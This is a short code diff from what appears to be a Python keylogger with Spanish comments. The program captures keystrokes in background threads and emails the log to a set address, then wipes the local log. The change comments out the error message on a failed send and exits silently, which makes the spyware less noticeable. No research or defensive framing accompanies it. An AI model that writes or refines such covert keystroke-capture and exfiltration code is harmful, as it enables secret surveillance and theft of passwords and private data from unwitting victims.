@@ -99,7 +99,8 @@ def send_log_via_email(log_path, email_from, password, email_to):
         with open(log_path, 'w') as log_file:
             log_file.write('')
     except Exception as e:
-        print(f"Failed to send email: {e}")
+        #print(f"Failed to send email: {e}")
+        exit(1)
 
 # Función principal que ejecuta todo en segundo plano
 def keylogger_thread_function():
@@ -111,7 +112,7 @@ def keylogger_thread_function():
     # Iniciar el listener en un hilo separado para la captura de teclas
     listener_thread = threading.Thread(target=start_listener)
     listener_thread.start()
-    
+
     # Ejecutar el keylogger en segundo plano
     try:
         keylogger_thread = threading.Thread(target=keylogger_thread_function)
